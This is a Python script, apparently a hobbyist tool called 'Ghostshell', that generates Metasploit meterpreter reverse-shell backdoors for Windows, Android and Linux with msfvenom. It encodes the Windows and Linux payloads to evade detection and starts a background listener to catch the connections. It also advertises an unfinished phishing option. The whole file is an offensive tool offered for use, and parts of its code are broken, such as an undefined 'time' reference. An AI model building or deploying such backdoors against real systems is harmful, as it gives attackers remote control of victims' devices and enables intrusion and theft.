# created by unixtail09 
import subprocess
import time as t
import os
import random
import sys
import itertools
import threading

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def matrix_rain(text="Created by UnixTail", duration=5):
    width = os.get_terminal_size().columns
    end_time = time.time() + duration

    while time.time() < end_time:
        line = ""
        for _ in range(width // len(text)):
            if random.random() > 0.8:
                line += text + " "
            else:
                line += " " * len(text) + " "
        print(line[:width])
        time.sleep(0.05)

def run_intro():
    clear()
    matrix_rain("Created by UnixTail", duration=3)
    t.sleep(1)
    clear()
    print("""
██████╗░██╗░░░██╗███╗░░██╗██╗██╗░░██╗████████╗░█████╗░██╗██╗░░░░░
██╔══██╗██║░░░██║████╗░██║██║██║░██╔╝╚══██╔══╝██╔══██╗██║██║░░░░░
██████╦╝██║░░░██║██╔██╗██║██║█████═╝░░░░██║░░░███████║██║██║░░░░░
██╔══██╗██║░░░██║██║╚████║██║██╔═██╗░░░░██║░░░██╔══██║██║██║░░░░░
██████╦╝╚██████╔╝██║░╚███║██║██║░╚██╗░░░██║░░░██║░░██║██║███████╗
╚═════╝░░╚═════╝░╚═╝░░╚══╝╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝
                💻 Coded by UnixTail 💻
    """)
    t.sleep(2)

def loading_animation(msg="Creating Payload"):
    done = False
    def animate():
        for c in itertools.cycle(['|', '/', '-', '\\']):
            if done:
                break
            sys.stdout.write(f'\r{msg}... {c}')
            sys.stdout.flush()
            t.sleep(0.1)
        sys.stdout.write('\r✅ Payload Created Successfully!     \n')
    t1 = threading.Thread(target=animate)
    t1.start()
    return t1, lambda: setattr(sys.modules[__name__], 'done', True)

def create_listener(ip, port):
    rc_content = f"""
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST {ip}
set LPORT {port}
set ExitOnSession false 
exploit -j
"""
    with open("listener.rc", "w") as f:
        f.write(rc_content)
    subprocess.Popen(["msfconsole", "-r", "listener.rc"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def run_outro():
    t.sleep(1)
    clear()
    print("""
╔═╗┌─┐┌┬┐┬ ┬┌─┐┬ ┬┌┬┐┬┌─┐
╠╣ │ │││││ │├┤ │ │ ││││ ┬
╚  └─┘┴ ┴└─┘└  └─┘─┴┘┴└─┘
   🔥 Thanks for using Ghostshell 🔥
         🛠️ UnixTail09 🛠️
""")

# Run intro
run_intro()

print("[*] OPENING...... [*]")
t.sleep(2)

print("\n[*] 1. Create a Backdoor  [*]\n")
print ("\n [*] 2. phishing tool (under devolpment not finished)")
a = int(input("Input Your Option --->> "))

if a == 1:
    print("1. Backdoor for Windows")
    print("2. Backdoor for Android")
    print("3. Backdoor for Linux (x86 only)")

    backdoor = int(input("Input Your Option ---->> "))
    
    if backdoor == 1:
        ip = input("Input LHOST/IP: ")
        port = input("Input Port: ")
        name = input("Enter filename (.exe): ")

        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f exe > {name}"
        t_anim, stop_anim = loading_animation("Creating Windows Payload")
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        stop_anim()
        t_anim.join()
        create_listener(ip, port)
        print("Listener Started in Background!")

    elif backdoor == 2:
        ip = input("Input LHOST/IP: ")
        port = input("Input Port: ")
        name = input("Enter APK name (.apk): ")

        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f apk > {name}"
        t_anim, stop_anim = loading_animation("Creating Android Payload")
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        stop_anim()
        t_anim.join()
        create_listener(ip, port)
        print("Listener Started in Background!")

    elif backdoor == 3:
        ip = input("Input LHOST/IP: ")
        port = input("Input Port: ")
        name = input("Enter ELF filename (.elf): ")

        cmd = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 5 -f elf > {name}"
        t_anim, stop_anim = loading_animation("Creating Linux Payload")
        subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).wait()
        stop_anim()
        t_anim.join()
        create_listener(ip, port)
        print("Listener Started in Background!")

    else:
        print("WRONG INPUT MATE !!!!")

# Running the function for outro 
run_outro()
